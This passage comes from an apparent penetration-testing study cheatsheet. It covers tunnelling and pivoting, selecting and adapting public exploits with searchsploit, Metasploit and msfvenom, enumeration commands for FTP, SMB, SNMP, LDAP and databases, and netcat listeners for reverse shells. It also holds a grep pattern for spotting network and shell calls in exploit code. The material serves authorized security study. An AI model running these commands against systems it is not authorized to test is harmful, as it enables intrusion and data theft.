text: id="variant-10-8-15-1-10">10.8.15.1.10 Find: Use a reverse Chisel SOCKS or fixed TCP tunnel Map an outbound pivot-to-server HTTP/WebSocket path and identify whether the assessment side needs a fixed listener or SOCKS access. chisel --version chisel server --help chisel client --help Recognize: The outbound carrier and server-side listener requirement identify a reverse-tunnel topology. Validate next: Verify server reverse mode, fingerprint, carrier upgrade, listener bind and pivot-to-destination compatibility. Use a reverse Chisel SOCKS or fixed TCP tunnel . <summary

title: 10.8.15.1.11 Find: Use forward Chisel SOCKS and version-supported UDP routing
text: id="variant-10-8-15-1-11">10.8.15.1.11 Find: Use forward Chisel SOCKS and version-supported UDP routing Identify which side can reach a tunnel server, then inspect the exact peer version and whether TCP or SOCKS5 UDP ASSOCIATE is required. chisel --version chisel client --help Recognize: Forward placement and actual client transport determine the mode; a UDP-capable tunnel binary does not make every wrapper UDP-capable. Validate next: Verify compatible peers, server SOCKS setting, listener route and the real application's UDP/TCP support. Use forward Chisel SOCKS and version-supported UDP routing . <summary

title: 10.8.15.1.12 Find: Route a selected internal subnet through Ligolo-ng
text: id="variant-10-8-15-1-12">10.8.15.1.12 Find: Route a selected internal subnet through Ligolo-ng Use the pivot's route/interface evidence and the intended application's transport needs to decide whether a routed interface is appropriate. ip route ip link ./proxy -h Recognize: A selected internal network and proxy-incompatible client suggest a route-style agent, subject to its own transport behavior. Validate next: Verify compatible proxy/agent, local privileges, carrier, selected route/interface, DNS and any separate reverse listener. Route a selected internal subnet through Ligolo-ng . <summary

title: 10.8.15.1.13 Find: Preserve DNS, Kerberos names and time across a pivot
text: id="variant-10-8-15-1-13">10.8.15.1.13 Find: Preserve DNS, Kerberos names and time across a pivot Compare name resolution, ticket server principals, clock and the KDC path when an IP service works but named authentication fails. getent hosts TARGET_HOST klist date -u Recognize: The route and credential may be valid while name/SPN context is wrong. Validate next: Check intended DNS source/result, realm/service name, time and KDC/service routes separately. Preserve DNS, Kerberos names and time across a pivot . <summary

title: 10.8.15.1.14 Find: Build the callback and delivery routes separately from the attack route
text: id="variant-10-8-15-1-14">10.8.15.1.14 Find: Build the callback and delivery routes separately from the attack route After the attack path works, draw a new path for target-initiated callbacks/downloads and inspect the listener actually advertised to that target. ss -lnt ip route get TARGET Recognize: A working initiating proxy path does not route a target's new connection back to that private interface. Validate next: Check the target's route, listener bind, chosen reverse forward/agent listener and final handler. Build the callback and delivery routes separately from the attack route . <summary

title: 10.8.15.1.15 Find: Compose multiple pivots and validate every connection leg
text: id="variant-10-8-15-1-15">10.8.15.1.15 Find: Compose multiple pivots and validate every connection leg Start from the last verified first-hop state, inspect the next foothold's routes and assign each new listener/carrier a source and destination. hostname ip route ss -lnt Recognize: The break lies beyond a known working leg; a connected second carrier is not a complete final route. Validate next: Test each listener-to-destination leg, names and return traffic independently from the correct source. Compose multiple pivots and validate every connection leg . <summary

title: 10.8.15.1.16 Find: Conditional: tunnel through controlled DNS infrastructure
text: id="variant-10-8-15-1-16">10.8.15.1.16 Find: Conditional: tunnel through controlled DNS infrastructure Use known carrier restrictions and an explicitly approved controlled domain to inspect delegation and DNS reachability. dig DOMAIN NS Recognize: Delegation is an infrastructure prerequisite; an NS record alone does not prove ownership or an operational tunnel. Validate next: Confirm authorized control, resolver path, compatible client/server/runtime and supported intended operation. Conditional: tunnel through controlled DNS infrastructure .

title: 10.9 Public Exploit Adaptation Cheatsheet
text: id="public-exploit-adaptation-cheatsheet">10.9 Public Exploit Adaptation Cheatsheet ← Cheatsheet index | Full procedure | Shells | Strategy map | Study methods: Select and adapt public exploits <h2

title: 10.9.1 Candidate gate
text: id="candidate-gate">10.9.1 Candidate gate exact component/build/configuration → exploit prerequisites → source audit → runtime/dependencies → minimal diff → bounded effect → independent verification → session handoff Record: source URL/EDB-ID/CVE/commit, affected component, OS/architecture, authentication , configuration, expected effect, runtime, dependencies, hard-coded values and stability risk. <h2

title: 10.9.2 SearchSploit
text: id="searchsploit">10.9.2 SearchSploit searchsploit --cve CVE searchsploit -t "PRODUCT VERSION" searchsploit PRODUCT VERSION --exclude="/dos/" searchsploit -p EDB_ID searchsploit -x EDB_ID searchsploit -w "PRODUCT VERSION" Copy working source: mkdir -p exploit-work && cd exploit-work searchsploit -m EDB_ID sha256sum EXPLOIT_FILE file EXPLOIT_FILE Named NSE candidate: nmap --script-help SCRIPT_NAME sed -n '1,240p' /usr/share/nmap/scripts/SCRIPT_NAME.nse nmap -Pn -p PORT --script SCRIPT_NAME --script-args 'ARG=VALUE' TARGET Read categories and code first. intrusive , exploit , brute and dos change risk; script output still requires independent validation. <h2

title: 10.9.3 Metasploit module — restricted exam choice
text: id="metasploit-module--restricted-exam-choice">10.9.3 Metasploit module — restricted exam choice msfconsole -q search type:exploit PRODUCT CVE info MODULE_NAME use MODULE_NAME show options show targets show payloads set RHOSTS TARGET set RPORT PORT set TARGET TARGET_ID set PAYLOAD PAYLOAD_NAME set LHOST LHOST set LPORT LPORT check run Current exam rule: Auxiliary/Exploit/Post modules, Meterpreter and even check lock Metasploit use to one selected target. Use freely only in authorized labs; recheck the guide before an exam. <h2

title: 10.9.4 Source audit
text: id="source-audit">10.9.4 Source audit sed -n '1,240p' EXPLOIT_FILE grep -nEi 'sudo|setuid|chmod|chown|rm |unlink|remove|subprocess|system\(|popen|exec\(|socket|connect|requests|curl|wget|powershell|cmd\.exe|/bin/(ba)?sh|http://|https://' EXPLOIT_FILE Check local privilege requests, destructive actions, third-party network calls, embedded commands/payloads, file writes, target/callback values, auth/session assumptions and false success conditions. <h2

title: 10.9.5 Python exploit
text: id="python-exploit">10.9.5 Python exploit python3 -m py_compile exploit.py python3 -m venv .venv source .venv/bin/activate python -m pip install --upgrade pip python -m pip install -r requirements.txt python -m pip freeze > requirements-resolved.txt Audit before --help ; some poor PoCs execute during import. Python 2 syntax and str / bytes errors are runtime problems, not exploit failures. <h2

title: 10.9.6 Compile
text: id="compile">10.9.6 Compile gcc -Wall -Wextra exploit.c -o exploit file exploit ldd exploit sha256sum exploit i686-w64-mingw32-gcc exploit.c -o exploit-x86.exe -lws2_32 x86_64-w64-mingw32-gcc exploit.c -o exploit-x64.exe -lws2_32 file exploit-x86.exe exploit-x64.exe Compile for where the exploit program runs. Generate the payload for the target execution context. Undefined reference = linker/library problem; Exec format error = wrong producer/consumer format or architecture. <h2

title: 10.9.7 Minimal edits
text: id="minimal-edits">10.9.7 Minimal edits cp EXPLOIT_FILE EXPLOIT_FILE.orig git diff --no-index -- EXPLOIT_FILE.orig EXPLOIT_FILE Review only evidence-backed changes to: target/port → scheme/base path/vhost → auth/cookie/CSRF → request method/body/headers → LHOST/LPORT → command/payload/architecture → paths/names → timing <h2

title: 10.9.8 Web exploit diagnostics
text: id="web-exploit-diagnostics">10.9.8 Web exploit diagnostics curl -i -X METHOD 'SCHEME://HOSTNAME:PORT/PATH' \ -H 'Host: HOSTNAME' \ -H 'Cookie: COOKIE' \ --data 'PARAM=VALUE' Scoped self-signed lab endpoint: curl -k -i 'https://HOSTNAME:PORT/PATH' Parser error: print status, final URL, response headers and a bounded response-body sample. Check redirect, failed auth, changed CSRF, error page, WAF/proxy response and certificate handling before changing parsing logic. <h2

title: 10.9.9 Existing memory-corruption PoC
text: id="existing-memory-corruption-poc">10.9.9 Existing memory-corruption PoC Do not redevelop it. Confirm exact build, architecture, target profile/return-address assumptions, offset, payload space, bad characters, payload type and crash/restart behavior. msfvenom -p PAYLOAD_NAME \ LHOST=LHOST LPORT=LPORT \ -f FORMAT -v VARIABLE \ -b 'POC_DOCUMENTED_BAD_CHARACTERS' \ -s POC_DOCUMENTED_MAX_SPACE <h2

title: 10.9.10 Proof ladder
text: id="proof-ladder">10.9.10 Proof ladder prerequisites confirmed → vulnerable path reached → bounded harmless effect → repeatable command execution → callback → usable session → host/identity/privilege verified The PoC's success message, HTTP 200 , uploaded filename, crash and TCP connection are not substitutes for the next proof. <h2

title: 10.9.11 Failure router
text: id="failure-router">10.9.11 Failure router Failure Next action No credible match Improve product/component/build/config evidence Suspicious local privilege/destructive code Stop; isolate or reject the PoC Import/dependency error Recreate per-tool environment Compiler error Fix named source/header/type issue Undefined reference Add correct documented linker library/order TLS failure Confirm HTTPS; use CA or scoped test override Redirect/login/CSRF failure Compare real browser request and state Success string, no effect Inspect success condition; independently verify Command works, callback does not Open shell diagnostic ladder <h2

title: 10.9.12 Evidence
text: id="evidence">10.9.12 Evidence Save original source URL and hash, exact prerequisites, dependency/compiler state, modified diff, payload-generation command, invocation, raw result and independent verification. Modified exploit code must remain attributable to its original source. <h2

title: 10.9.13 Discover and recognize candidates
text: id="discover-and-recognize-candidates">10.9.13 Discover and recognize candidates Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries. <h3

title: 10.9.13.1 Select and adapt public exploits
text: id="select-and-adapt-public-exploits">10.9.13.1 Select and adapt public exploits <summary

title: 10.9.13.1.1 Find: Match a public exploit to the actual component and configuration
text: id="variant-10-9-13-1-1">10.9.13.1.1 Find: Match a public exploit to the actual component and configuration Join application fingerprint/configuration evidence with the advisory and PoC's stated preconditions before selecting the exploit. searchsploit PRODUCT VERSION searchsploit -x EXPLOIT_ID Recognize: The exact feature/role/build conditions identify what must be checked; a product-name hit does not establish applicability. Validate next: Resolve every required condition and define the smallest observable proof of the expected effect. Match a public exploit to the actual component and configuration . <summary

title: 10.9.13.1.2 Find: Audit a PoC and reproduce its interpreter/dependency environment
text: id="variant-10-9-13-1-2">10.9.13.1.2 Find: Audit a PoC and reproduce its interpreter/dependency environment Read the candidate source and local error path before interpreting target success/failure; inspect interpreter/import and dependency requirements. file exploit.py python3 --version python3 -m pip --version Recognize: The failure occurred locally before the vulnerable request; it says nothing about target patch state. Validate next: Review side effects, reproduce supported dependencies/interpreter and observe the real request before judging exploitation. Audit a PoC and reproduce its interpreter/dependency environment . <summary

title: 10.9.13.1.3 Find: Compile and minimally adapt an existing native or memory-corruption PoC
text: id="variant-10-9-13-1-3">10.9.13.1.3 Find: Compile and minimally adapt an existing native or memory-corruption PoC Inspect the native PoC's documented target process, compiler flags, ABI and artifact before running it in a target context. file COMPILED_ARTIFACT uname -m getconf LONG_BIT Recognize: An architecture/ABI mismatch explains a compatibility problem before exploit logic is evaluated. Validate next: Confirm target process rather than just OS architecture, required libraries/loader and documented exploit-specific constraints. Compile and minimally adapt an existing native or memory-corruption PoC . <summary

title: 10.9.13.1.4 Find: Repair a web PoC using the real HTTP transaction
text: id="variant-10-9-13-1-4">10.9.13.1.4 Find: Repair a web PoC using the real HTTP transaction Capture the application's real valid transaction and compare it with the PoC's request path, login/session sequence and response parser. curl -sk -i -b cookies.txt http://TARGET:PORT/PATH Recognize: The request never reached the protected operation; the success parser may be reading a login response. Validate next: Restore valid host/path/session/CSRF state, then independently verify the exploit effect. Repair a web PoC using the real HTTP transaction .

title: 10.10 Service Opportunity Cheatsheet
text: id="service-opportunity-cheatsheet">10.10 Service Opportunity Cheatsheet ← Cheatsheet index · Previous: discovery and scanning · Complete procedures · Mechanics | Strategy map | Study methods: Extract opportunities from services Use this after application identification. Commands are examples for explicitly authorized targets; replace every placeholder. Enter with the discovery tuple and extend it: SOURCE -> TARGET | TRANSPORT/PORT | APPLICATION EVIDENCE | COVERAGE LIMIT | ACCESS CONTEXT | NAMESPACE/OBJECT | ACTION | RESULT | NEXT <h2

title: 10.10.1 Decision loop
text: id="decision-loop">10.10.1 Decision loop CONFIRM APPLICATION -> TEST LEAST-PRIVILEGED CONTEXT (anonymous/null/known credential) -> LIST NAMESPACE BEFORE COPYING/QUERYING -> MEASURE READ / WRITE / ADMIN / EXECUTE RIGHTS SEPARATELY -> EXTRACT NAMES, FILES, CONFIGURATION, CREDENTIAL CLUES -> VALIDATE THE CHEAPEST DECISIVE HYPOTHESIS -> RE-ENUMERATE AFTER NEW IDENTITY, HOST, ROUTE OR ACCESS Output Safe conclusion Next action Authentication accepted Identity/method works for this protocol Enumerate authorization ; do not assume session/admin rights Read succeeds This identity can read that object Inspect locally; map disclosed names/credentials Write succeeds This identity can alter that object/path Find consumer, execution identity and trigger before claiming execution Access denied This object/action denied in this context Try a legitimately acquired identity or a different allowed object Timeout/silence Cause unresolved Check route, transport, version and a protocol-aware probe <h2

title: 10.10.2 FTP
text: id="ftp">10.10.2 FTP ftp TARGET # anonymous / email-like password; then: status, pwd, ls -la, binary, get FILE nmap -sV -p PORT --script ftp-anon,ftp-syst TARGET curl --list-only ftp://TARGET/ curl -o FILE ftp://TARGET/path/FILE curl --user USER --upload-file ./probe.txt ftp://TARGET/path/probe.txt 230 accepts login; 530 rejects that login. Upload proves write only. Full FTP procedure . <h2

title: 10.10.3 SSH
text: id="ssh">10.10.3 SSH ssh -v -p PORT USER@TARGET chmod 600 KEY ssh -v -i KEY -p PORT USER@TARGET nmap -p PORT --script ssh-auth-methods --script-args "ssh.user=USER" TARGET Separate route, host-key, method, credential and shell-policy failures. Spraying/cracking is a later block. Full SSH procedure . <h2

title: 10.10.4 SMTP
text: id="smtp">10.10.4 SMTP nc -nv TARGET PORT # EHLO example.invalid # HELP # VRFY USER # EXPN postmaster # QUIT openssl s_client -connect TARGET:587 -starttls smtp -crlf -quiet openssl s_client -connect TARGET:465 -crlf -quiet smtp-user-enum -M VRFY -U users.txt -t TARGET -p PORT 252 is inconclusive , not a confirmed user. Compare response codes and final multiline reply. Full SMTP procedure . <h2

title: 10.10.5 DNS
text: id="dns">10.10.5 DNS dig @TARGET DOMAIN SOA dig @TARGET DOMAIN NS dig @TARGET DOMAIN MX dig @TARGET DOMAIN TXT dig @TARGET -x IP dig @TARGET DOMAIN AXFR dnsrecon -d DOMAIN -n TARGET -t std dnsrecon -d DOMAIN -n TARGET -D WORDLIST -t brt dnsenum --dnsserver TARGET DOMAIN dnsrecon -r SUBNET -n TARGET nslookup HOST.DOMAIN TARGET nslookup -type=TXT HOST.DOMAIN TARGET AXFR refusal disproves only that transfer attempt. NXDOMAIN differs from NOERROR with no answer. Check wildcard results. Full DNS procedure . <h2

title: 10.10.6 NFS and Unix RPC
text: id="nfs-and-unix-rpc">10.10.6 NFS and Unix RPC <h3

title: 10.10.6.1 rpcinfo -p TARGET
text: id="variant-10-10-6-1">10.10.6.1 rpcinfo -p TARGET rpcinfo -p TARGET showmount -e TARGET nmap -sV -p 111,2049 --script nfs-showmount,nfs-ls,nfs-statfs TARGET sudo mkdir -p /mnt/nfs-audit sudo mount -t nfs -o ro,vers=3,nolock TARGET:/EXPORT /mnt/nfs-audit ls -lan /mnt/nfs-audit find /mnt/nfs-audit -maxdepth 3 -ls sudo umount /mnt/nfs-audit <h3

title: 10.10.6.2 Only when a harmless write check is required:
text: id="variant-10-10-6-2">10.10.6.2 Only when a harmless write check is required: # Only when a harmless write check is required: sudo mount -t nfs -o rw,vers=3,nolock TARGET:/EXPORT /mnt/nfs-audit touch /mnt/nfs-audit/probe-file ls -ln /mnt/nfs-audit/probe-file rm /mnt/nfs-audit/probe-file sudo umount /mnt/nfs-audit NFSv4-only servers may not answer showmount . Interpret numeric UID/GID, root_squash , write rights and privileged consumption separately. Full NFS/RPC procedure . <h2

title: 10.10.7 SMB and MS-RPC
text: id="smb-and-ms-rpc">10.10.7 SMB and MS-RPC smbclient -N -L //TARGET smbclient -L //TARGET -U 'DOMAIN/USER' smbclient //TARGET/SHARE -U 'DOMAIN/USER' smbclient -L //TARGET -U 'TARGET/USER' smbclient -L //TARGET -U 'guest%' # pwd, ls, allinfo FILE, get FILE rpcclient -U '' -N TARGET rpcclient -U 'DOMAIN/USER' TARGET # srvinfo, enumdomains, enumdomusers, enumdomgroups, queryuser RID, netshareenumall nxc smb TARGET -u USER -p PASSWORD --shares enum4linux-ng -A TARGET nmap -p 139,445 --script smb-protocols,smb2-security-mode,smb2-time TARGET net view \\TARGET /all Get-ChildItem \\TARGET\SHARE Get-Content \\TARGET\SHARE\FILE Null, guest and authenticated sessions can expose different namespaces. Confirm useful results manually. Full SMB/RPC procedure . <h2

title: 10.10.8 SNMP
text: id="snmp">10.10.8 SNMP <h3

title: 10.10.8.1 onesixtyone -c COMMUNITY_FILE TARGET
text: id="variant-10-10-8-1">10.10.8.1 onesixtyone -c COMMUNITY_FILE TARGET onesixtyone -c COMMUNITY_FILE TARGET snmpwalk -v2c -c COMMUNITY TARGET 1.3.6.1.2.1 snmpbulkwalk -v2c -c COMMUNITY TARGET 1.3.6.1.2.1 <h3

title: 10.10.8.2 users, processes, installed software, TCP listeners
text: id="variant-10-10-8-2">10.10.8.2 users, processes, installed software, TCP listeners # users, processes, installed software, TCP listeners snmpwalk -v1 -c COMMUNITY TARGET 1.3.6.1.4.1.77.1.2.25 snmpwalk -v1 -c COMMUNITY TARGET 1.3.6.1.2.1.25.4.2.1.2 snmpwalk -v1 -c COMMUNITY TARGET 1.3.6.1.2.1.25.6.3.1.2 snmpwalk -v1 -c COMMUNITY TARGET 1.3.6.1.2.1.6.13.1.3 snmpwalk -v3 -l authPriv -u USER -a SHA -A AUTH_PASSWORD -x AES -X PRIV_PASSWORD TARGET 1.3.6.1.2.1 No response can be community, version, OID, loss or filtering. A write community is not permission to alter state during enumeration. Full SNMP procedure . <h2

title: 10.10.9 LDAP and Kerberos
text: id="ldap-and-kerberos">10.10.9 LDAP and Kerberos ldapsearch -x -LLL -H ldap://DC_IP:389 -s base -b '' defaultNamingContext dnsHostName ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -b 'DC=DOMAIN,DC=TLD' '(&(objectCategory=person)(objectClass=user))' \ sAMAccountName userPrincipalName memberOf description servicePrincipalName getent hosts DC_HOST nc -nvz DC_IP 88 date -u RootDSE may work when anonymous directory search does not. Kerberos failures often come from DNS/hostname/ SPN /time/route rather than the password. Full LDAP/Kerberos procedure . <h2

title: 10.10.10 Databases
text: id="databases">10.10.10 Databases <h3

title: 10.10.10.1 MySQL / MariaDB
text: id="mysql--mariadb">10.10.10.1 MySQL / MariaDB mysql -h TARGET -P PORT -u USER -p SELECT VERSION(), USER(), CURRENT_USER(); SHOW DATABASES; SHOW GRANTS; USE DATABASE; SHOW TABLES; SELECT * FROM TABLE LIMIT 20; SELECT @@secure_file_priv; <h3

title: 10.10.10.2 MSSQL
text: id="mssql">10.10.10.2 MSSQL impacket-mssqlclient 'USER@TARGET' impacket-mssqlclient 'DOMAIN/USER@TARGET' -windows-auth SELECT @@VERSION; SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin'); SELECT name FROM sys.databases; <h3

title: 10.10.10.3 PostgreSQL
text: id="postgresql">10.10.10.3 PostgreSQL psql -h TARGET -p PORT -U USER -d postgres # \conninfo \l \du \dn \dt *.* SELECT version(), current_user, session_user; SELECT pg_has_role(current_user, 'pg_execute_server_program', 'member'); DB admin is not OS admin. Server file/program functions act as the DB service identity and require explicit grants. Full database procedure . <h2

title: 10.10.11 Windows remote access
text: id="windows-remote-access">10.10.11 Windows remote access xfreerdp3 /v:TARGET /u:USER /d:DOMAIN /auth-only /cert:ignore xfreerdp3 /v:TARGET /u:USER /d:DOMAIN /dynamic-resolution /cert:ignore nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info TARGET evil-winrm -i TARGET -u USER evil-winrm -i TARGET -u 'DOMAIN\\USER' evil-winrm -i TARGET -u USER -S -P 5986 $cred = Get-Credential Enter-PSSession -ComputerName TARGET -Credential $cred Valid credentials may still lack RDP logon or WinRM endpoint rights. Check the installed FreeRDP/Evil-WinRM help for version-specific spelling. Full Windows remote-access procedure . <h2

title: 10.10.12 New-state triggers
text: id="new-state-triggers">10.10.12 New-state triggers New finding Immediate study/practice action Hostname or IP Confirm scope, resolve both directions, run discovery/service identification Username/domain Record confidence and source; do not promote ambiguous SMTP output to confirmed Credential/key Identify local/domain context and likely services; perform one controlled validation Readable file Preserve metadata and inspect locally for paths, names, keys and configuration Writable path Identify consumer, execution identity and trigger before testing exploitation Remote session Verify host/identity/IP, then re-enumerate local privileges, files, listeners and routes <h2

title: 10.10.13 SMBMap and authenticated SMB/RPC collection
text: id="smbmap-and-authenticated-smbrpc-collection">10.10.13 SMBMap and authenticated SMB/RPC collection Use an accepted account and reachable SMB; inspect one share before downloading a selected file. smbmap -H TARGET -d DOMAIN -u USER -p 'PASSWORD' --no-write-check smbmap -H TARGET -d DOMAIN -u USER -p 'PASSWORD' -r 'SHARE' --depth 2 --no-write-check smbmap -H TARGET -d DOMAIN -u USER -p 'PASSWORD' --download 'SHARE\PATH\FILE' --no-write-check enum4linux-ng -A -w DOMAIN -u USER -p 'PASSWORD' TARGET A readable config/backup → classify the value and test the matching service. Share-list denial does not rule out a known share path. Full SMB/RPC procedure . <h2

title: 10.10.14 Discover and recognize candidates
text: id="discover-and-recognize-candidates">10.10.14 Discover and recognize candidates Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries. <h3

title: 10.10.14.1 Extract opportunities from services
text: id="extract-opportunities-from-services">10.10.14.1 Extract opportunities from services <summary

title: 10.10.14.1.1 Find: Use anonymous or authenticated FTP file access
text: id="variant-10-10-14-1-1">10.10.14.1.1 Find: Use anonymous or authenticated FTP file access After identifying FTP, test the allowed anonymous context or one known credential and inspect its directory namespace. curl -v ftp://TARGET/ curl -v --user 'USER:PASSWORD' ftp://TARGET/ Recognize: A listing identifies candidate artifacts; a completed RETR with recognizable bytes establishes read access. Validate next: Validate the account context, file contents, data-channel reachability and any separate write/consumer conditions. Use anonymous or authenticated FTP file access . <summary

title: 10.10.14.1.2 Find: Use SSH passwords, keys and forwarding-capable access
text: id="variant-10-10-14-1-2">10.10.14.1.2 Find: Use SSH passwords, keys and forwarding-capable access Find SSH in service discovery, then trace a candidate password/key back to its recorded user before a bounded authentication attempt. ssh -v -p PORT USER@TARGET ssh -v -i KEY -p PORT USER@TARGET Recognize: Accepted key authentication plus a verified shell identity establishes that specific login, not root or unrestricted forwarding. Validate next: Check actual account/shell/subsystem and separately inspect forwarding policy if a tunnel is needed. Use SSH passwords, keys and forwarding-capable access . <summary

title: 10.10.14.1.3 Find: Enumerate SMTP identities and accessible mailbox protocols
text: id="variant-10-10-14-1-3">10.10.14.1.3 Find: Enumerate SMTP identities and accessible mailbox protocols Identify mail-related listeners, inspect greeting/capabilities and compare permitted user-discovery replies with a known-invalid control. nc -nv TARGET 25 Then enter the protocol dialogue: EHLO example.invalid VRFY USER VRFY INVALID_CONTROL QUIT Recognize: A reproducible reply difference can expose a possible mailbox identity. Validate next: Check catch-all policy and account context; recipient acceptance does not prove mailbox credentials or OS access. Enumerate SMTP identities and accessible mailbox protocols . <summary

title: 10.10.14.1.4 Find: Expand names through DNS records and zone transfers
text: id="variant-10-10-14-1-4">10.10.14.1.4 Find: Expand names through DNS records and zone transfers Use DNS-server evidence and discovered domain names to query authority and specific records before considering a transfer. dig @TARGET DOMAIN SOA dig @TARGET DOMAIN NS dig @TARGET DOMAIN AXFR Recognize: An authoritative zone and returned records can expose hostnames, aliases and applications needing separate enumeration. Validate next: Check each new name's scope/address and verify host/virtual-host behavior. Expand names through DNS records and zone transfers . <summary

title: 10.10.14.1.5 Find: Inspect RPC/NFS exports and effective file identity
text: id="variant-10-10-14-1-5">10.10.14.1.5 Find: Inspect RPC/NFS exports and effective file identity Follow RPC/NFS discovery with export inspection, then examine actual ownership/mapping on an allowed mount. rpcinfo -p TARGET showmount -e TARGET Recognize: An export lists a filesystem candidate and client policy; it does not establish file access or trusted UID 0. Validate next: Use the owning procedure to verify NFS version, allowed client, numeric identity mapping, read/write and squash/mount policy. Inspect RPC/NFS exports and effective file identity . <summary

title: 10.10.14.1.6 Find: Enumerate SMB/RPC shares, files and identities
text: id="variant-10-10-14-1-6">10.10.14.1.6 Find: Enumerate SMB/RPC shares, files and identities Start from confirmed SMB and explicitly compare anonymous versus a known authenticated context, then open a relevant named share. smbclient -L //TARGET -N smbclient -L //TARGET -U 'DOMAIN/USER' Recognize: A share name supplies a filesystem investigation target; listing it does not prove read, write or service creation. Validate next: Connect to the named share under the identity that listed it, then ls/get the exact object. Listing a share does not prove read or write. For a write candidate, verify the path operation and identify a separate execution consumer before treating it as access. Enumerate SMB/RPC shares, files and identities . <summary

title: 10.10.14.1.7 Find: Extract configuration and process information through SNMP
text: id="variant-10-10-14-1-7">10.10.14.1.7 Find: Extract configuration and process information through SNMP Take UDP/161 evidence and a justified management credential/community, then request a small known OID branch before a broad walk. snmpwalk -v2c -c COMMUNITY TARGET 1.3.6.1.2.1.1 Recognize: A real OID response confirms the accepted read context and supplies software/name clues. Validate next: Determine which useful views/branches are actually readable; process data and write rights are separate. Extract configuration and process information through SNMP . <summary

title: 10.10.14.1.8 Find: Use MySQL/MariaDB data and file primitives
text: id="variant-10-10-14-1-8">10.10.14.1.8 Find: Use MySQL/MariaDB data and file primitives Use a known application/database login and inspect identity, grants and file-operation constraints before choosing an OS transition. SELECT USER(),CURRENT_USER(),VERSION(); SHOW GRANTS; SHOW VARIABLES LIKE 'secure_file_priv'; Recognize: SELECT permits data investigation; absent FILE/admin rights and the restricted directory constrain file/OS hypotheses. Validate next: Check exact grants, useful tables, destination OS permissions and an execution consumer before escalating a file operation. Use MySQL/MariaDB data and file primitives . <summary

title: 10.10.14.1.9 Find: Use SQL Server rights, impersonation and command facilities
text: id="variant-10-10-14-1-9">10.10.14.1.9 Find: Use SQL Server rights, impersonation and command facilities Once SQL Server authentication works, inspect actual login/server role and supported impersonation context. SELECT SYSTEM_USER, ORIGINAL_LOGIN(), @@VERSION; SELECT IS_SRVROLEMEMBER('sysadmin'); Recognize: A valid login with sysadmin=0 is data/rights evidence, not permission to enable xp_cmdshell. Validate next: Enumerate actual database/server grants and useful impersonation; independently verify any OS facility and its identity. Use SQL Server rights, impersonation and command facilities . <summary

title: 10.10.14.1.10 Find: Use PostgreSQL data and privileged program execution
text: id="variant-10-10-14-1-10">10.10.14.1.10 Find: Use PostgreSQL data and privileged program execution Authenticate to the observed database and inspect current/session identity and role attributes before program/file functions. SELECT current_user,session_user,version(); SELECT rolname,rolsuper FROM pg_roles WHERE rolname=current_user; Recognize: An ordinary database role does not automatically have COPY PROGRAM or server-file access. Validate next: Inspect effective role memberships and exact operation rights, then the database service's OS context. Use PostgreSQL data and privileged program execution . <summary

title: 10.10.14.1.11 Find: Inspect Redis access and persistence boundaries
text: id="variant-10-10-14-1-11">10.10.14.1.11 Find: Inspect Redis access and persistence boundaries Identify Redis and use its authentication context to distinguish accepted commands from denied administrative facilities. redis-cli -h TARGET -p PORT PING Recognize: The connection is usable but command ACLs can remove persistence/configuration methods. Validate next: Inspect allowed operations, data visibility and actual persistence/destination/consumer conditions. Inspect Redis access and persistence boundaries . <summary

title: 10.10.14.1.12 Find: Triage Oracle listener and database identity
text: id="variant-10-10-14-1-12">10.10.14.1.12 Find: Triage Oracle listener and database identity Use service discovery and an application's connection descriptor to distinguish listener identification from a valid database session. nmap -Pn -sV -p 1521 TARGET Recognize: Listener/product evidence and a service name establish a connection candidate, not database credentials or DBA rights. Validate next: Validate the exact descriptor/account and inspect its permitted database action. Triage Oracle listener and database identity . <summary

title: 10.10.14.1.13 Find: Validate RDP, WinRM, VNC and Telnet access contexts
text: id="variant-10-10-14-1-13">10.10.14.1.13 Find: Validate RDP, WinRM, VNC and Telnet access contexts Take remote-access listeners from discovery and validate one known identity against the specific endpoint/logon type. Test-NetConnection TARGET -Port 3389 Test-NetConnection TARGET -Port 5985 Recognize: Transport offers an RDP candidate from this source; it does not establish remote-interactive rights. Validate next: Check actual protocol, local/domain context, accepted authentication and endpoint/logon authorization. Validate RDP, WinRM, VNC and Telnet access contexts . <summary

title: 10.10.14.1.14 Find: Discover LDAP naming contexts and authenticated search
text: id="variant-10-10-14-1-14">10.10.14.1.14 Find: Discover LDAP naming contexts and authenticated search Identify the directory endpoint and query RootDSE before a subtree search under a known bind identity. ldapsearch -x -LLL -H ldap://DC_IP -s base -b '' defaultNamingContext namingContexts Recognize: RootDSE supplies the search base; it does not grant arbitrary anonymous subtree access. Validate next: Check bind identity, transport/signing requirements and read visibility on the selected objects. Discover LDAP naming contexts and authenticated search . <summary

title: 10.10.14.1.15 Find: Investigate SIP/IRC identity and configuration clues
text: id="variant-10-10-14-1-15">10.10.14.1.15 Find: Investigate SIP/IRC identity and configuration clues Classify the unusual listener, then use its normal greeting/registration behavior and the owning procedure's bounded protocol checks. nmap -Pn -sV -p PORT TARGET nc -nv TARGET PORT Recognize: The real protocol and registration state determine the next client operation; the expected port label is insufficient. Validate next: Verify application/version, accepted interaction and exact exploit/access conditions. Investigate SIP/IRC identity and configuration clues .

title: 10.11 Shells and Payloads Cheatsheet
text: id="shells-and-payloads-cheatsheet">10.11 Shells and Payloads Cheatsheet ← Cheatsheet index | Full procedure | Payload obstacles | Public exploits | Strategy map | Study methods: Establish sessions and move files <h2

title: 10.11.1 State model
text: id="state-model">10.11.1 State model delivery → execution → connection → usable session Prove each transition separately. A hung request is not a shell; a TCP connection is not necessarily an interactive session. <h2

title: 10.11.2 Choose access
text: id="choose-access">10.11.2 Choose access Evidence Choose One bounded command is enough Direct execution Valid credential + enabled remote service SSH/WinRM/RDP Target can reach Kali Reverse shell Kali can reach a target listener Bind shell Staged/protocol-aware payload Matching multi/handler <h2

title: 10.11.3 Listener
text: id="listener">10.11.3 Listener Traditional/OpenBSD-style Netcat: rlwrap nc -lvnp LPORT Nmap Ncat: ncat -4 -lvn 0.0.0.0 LPORT Verify: ss -lntp | grep ':LPORT' Select LHOST from the target's route. Confirm the listener is not bound only to loopback or the wrong interface/address family. <h2

title: 10.11.4 Linux reverse shells
